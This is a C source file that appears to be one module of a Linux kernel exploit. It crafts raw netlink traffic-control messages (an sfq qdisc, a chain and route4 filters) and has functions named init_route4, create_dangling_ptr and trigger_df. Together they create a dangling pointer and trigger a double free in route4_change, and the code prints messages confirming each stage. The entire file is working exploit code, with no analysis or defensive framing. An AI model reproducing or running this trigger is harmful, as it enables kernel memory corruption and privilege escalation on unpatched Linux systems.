#define _GNU_SOURCE
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>
#include <linux/rtnetlink.h>
#include <linux/tc_ematch/tc_em_meta.h>
#include "route4_df.h"

static int sockfd = -1;

#define NLMSG_TAIL(nmsg) \
  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

static int addattr_l(struct nlmsghdr *n, int maxlen, int type,
        const void *data, int alen)
{
  int len = RTA_LENGTH(alen);
  struct rtattr *rta;

  if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
    fprintf(stderr, "addattr_l ERROR: message exceeded bound of %d\n", maxlen);
    return -1;
  }

  rta = NLMSG_TAIL(n);
  rta->rta_type = type;
  rta->rta_len = len;
  if (alen)
    memcpy(RTA_DATA(rta), data, alen);
  n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
  return 0;
}

static struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type)
{
  struct rtattr *nest = NLMSG_TAIL(n);

  addattr_l(n, maxlen, type, NULL, 0);
  return nest;
}

static int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)
{
  nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
  return n->nlmsg_len;
}

static int create_chain(int fd, u_int32_t chain_idx)
{
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    msg->nlmsg_type = RTM_NEWCHAIN; 
    
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_MAKE(1 << 16, 0);

    addattr_l(msg, 0x1000, TCA_CHAIN, &chain_idx, 4);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    int ret = sendmsg(fd, &msgh, 0);
    free(start);
    return ret;
}

static int add_qdisc(int fd)
{
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new qdisc
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    // set local
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;
    t->tcm_handle = TC_H_MAKE(1 << 16, 0);

    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);

    addattr_l(msg, 0x1000, TCA_KIND, "sfq", 4);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    return sendmsg(fd, &msgh, 0);
}


static int add_tc_(int fd, u_int32_t from, u_int32_t to,
        u_int32_t handle, u_int16_t flags, u_int32_t chain_idx)
{
    char *start = malloc(0x2000);
    memset(start, 0, 0x2000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new filter
    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | flags;
    msg->nlmsg_type = RTM_NEWTFILTER;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_handle = handle;

    addattr_l(msg, 0x2000, TCA_CHAIN, &chain_idx, 4);

    addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
    addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);
    addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);
    addattr_nest_end(msg, tail);

    // packing
    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);
    return 1;
}

void init_route4()
{
    sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
    assert(sockfd > 0);
    add_qdisc(sockfd);
    create_chain(sockfd, 69);
    u_int8_t from = 0x7f;
    u_int8_t to = 0xff;
    u_int32_t handle = ((0 & from) << 16) | (0 & to);
    add_tc_(sockfd, from, to, handle, NLM_F_EXCL | NLM_F_CREATE, 69);
    printf("[+][%s] Qdisc added\n", __FILE__);
}

void create_dangling_ptr()
{
    add_tc_(sockfd, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE, 69);
    add_tc_(sockfd, 1, 2, 0, NLM_F_CREATE, 69);
    usleep(500 * 300);
    printf("[+][%s] Dangling ptr created\n", __FILE__);
}

void trigger_df()
{
    add_tc_(sockfd, 1, 3, 0, NLM_F_CREATE, 69);
    usleep(500 * 1000);
    printf("[+][%s] Double free of route4_change triggered\n", __FILE__);
}
